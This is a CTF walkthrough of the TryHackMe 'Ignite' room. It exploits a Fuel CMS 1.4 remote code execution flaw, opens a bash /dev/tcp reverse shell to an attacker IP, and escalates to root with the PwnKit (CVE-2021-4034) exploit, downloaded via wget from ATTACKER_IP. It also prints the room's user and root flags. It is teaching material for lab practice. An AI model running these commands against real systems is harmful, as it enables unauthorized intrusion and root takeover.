# Ignite Write‑up

A beginner‑friendly **TryHackMe** challenge focused on web exploitation, reverse shells, and Linux privilege escalation using the **Fuel CMS** vulnerability and **Polkit** misconfiguration.

Room: Ignite

---

# Target Information

## Target Machine IP

```
10.130.138.173
```

---

# Connectivity Check

First, I verified that the target machine was reachable using **ping**.

```
ping 10.130.138.173
```

The host responded successfully, confirming that the machine was **online and reachable**.

---

# Port Scanning

Next, I performed a service scan using **Nmap** to identify open ports and running services.

```
nmap -sV 10.130.138.173
```

### Result

```
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
```

### Findings

Only one port was discovered:

|Port|Service|
|---|---|
|80|HTTP|

Since a web service was available, the next step was **web enumeration**.

---

# Web Enumeration

Opening the website in the browser revealed the following message:

```
Welcome to Fuel CMS
Version 1.4
```

This indicated that the server was running **Fuel CMS version 1.4**.

---

## Directory Enumeration

To discover hidden directories, I used **ffuf**.

```
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.130.138.173/FUZZ
```

However, the scan did **not reveal anything interesting**.

---

# Vulnerability Research

Since the website clearly displayed:

```
Fuel CMS Version 1.4
```

I searched online for vulnerabilities affecting this version.

I discovered that **Fuel CMS 1.4 is vulnerable to Remote Code Execution (RCE).**

An exploit was available on GitHub:

[https://github.com/Errahulaws/fuel-cms-1.4-RCA-exploit](https://github.com/Errahulaws/fuel-cms-1.4-RCA-exploit)

---

# Exploitation

I cloned the exploit repository:

```
git clone https://github.com/Errahulaws/fuel-cms-1.4-RCA-exploit.git
```

```
cd fuel-cms-1.4-RCA-exploit
```

Inside the exploit script, I modified the **target IP address**.

```
nano fuelcms_rce.py
```

Then I executed the exploit:

```
python3 fuelcms_rce.py
```

### Result

```
cmd: pwd
system/var/www/html

cmd: whoami
systemwww-data
```

This confirmed that **remote command execution was successful** and I had command execution as the **www-data** user.

---

# Reverse Shell

To obtain a more stable shell, I decided to establish a **reverse shell**.

First, I started a listener on my attack machine using **Netcat**.

```
nc -lvnp 4444
```

Then I executed the following command through the RCE shell:

```
bash -c "bash -i >& /dev/tcp/192.168.128.91/4444 0>&1"
```

### Result

```
connect to [192.168.128.91] from (UNKNOWN) [10.130.138.173]
www-data@ubuntu:/var/www/html$
```

A reverse shell was successfully established.

---

# Shell Stabilization

To improve the shell experience, I upgraded it using Python.

```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Then I set the terminal type:

```
export TERM=xterm
```

This allowed better interaction with the shell.

---

# User Flag

Next, I searched for the user flag.

```
cat /home/www-data/flag.txt
```

### Result

```
6470e394cbf6dab6a91682cc8585059b
```

---

# Privilege Escalation

To escalate privileges, I searched for **SUID binaries**.

```
find / -perm -4000 2>/dev/null
```

### Results

Several SUID binaries were discovered, including:

```
/usr/bin/pkexec
/usr/bin/sudo
/bin/mount
/bin/umount
```

I attempted several techniques from **GTFOBins**, but none worked.

---

# Pkexec Vulnerability

While investigating further, I checked the version of **pkexec**.

```
pkexec --version
```

### Result

```
pkexec version 0.105
```

This version is vulnerable to **CVE‑2021‑4034**, also known as **PwnKit**, a privilege escalation vulnerability in **Polkit**.

---

# Exploit Preparation

I cloned the exploit repository:

[https://github.com/ryaagard/CVE-2021-4034](https://github.com/ryaagard/CVE-2021-4034)

```
git clone https://github.com/ryaagard/CVE-2021-4034
```

Then I started a Python web server to transfer the exploit to the target machine.

```
python3 -m http.server 8000
```

From the target machine, I downloaded the exploit.

```
wget http://ATTACKER_IP:8000/CVE-2021-4034.zip
```

After extracting the files, I compiled the exploit.

```
make
```

This generated two files:

```
evil.so
exploit
```

---

# Root Shell

Running the exploit triggered the vulnerability in **pkexec**.

This spawned a **root shell**.

Verification:

```
whoami
```

Result:

```
root
```

---

# Root Flag

Finally, I retrieved the root flag.

```
cat /root/root.txt
```

### Result

```
b9bbcb33e11b80be759c4e844862482d
```

---

# Flags Captured

| Flag      | Value                            |
| --------- | -------------------------------- |
| User Flag | 6470e394cbf6dab6a91682cc8585059b |
| Root Flag | b9bbcb33e11b80be759c4e844862482d |

---

# Skills Learned

This room demonstrated several important penetration testing techniques:

- Network scanning with **Nmap**
    
- Web vulnerability research
    
- Exploiting **Fuel CMS RCE**
    
- Reverse shells with **Netcat**
    
- Shell stabilization techniques
    
- Linux enumeration
    
- SUID privilege escalation
    
- Exploiting **CVE‑2021‑4034 (PwnKit)**